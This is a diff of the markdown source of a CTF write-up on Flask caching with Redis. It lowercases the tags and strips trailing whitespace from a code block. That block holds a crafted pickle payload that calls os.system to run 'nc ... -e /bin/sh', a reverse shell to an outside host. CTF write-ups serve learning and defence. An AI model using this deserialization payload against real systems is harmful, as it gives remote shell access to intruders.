@@ -1,7 +1,7 @@
 ---
 title: "CTF Flask Caching"
 date: 2020-12-03T08:14:05-05:00
-tags: ["CTF", "UFSIT", "python", "redis", "flask"]
+tags: ["ctf", "ufsit", "python", "redis", "flask"]
 ---
 
 ## Introduction
@@ -22,10 +22,10 @@ Below is a form of this pickle that has been crafted to connect to a DO Droplet:
 `pickle`
 
 ```text
-!cos                                                                                                                      
-system                                                                                                                    
+!cos
+system
 (S'nc REDACTED-IP 6969 -e /bin/sh'
-tR.%  
+tR.%
 ```
 
 One question that we had while crafting this pickle was whether or not the challenge was intended to
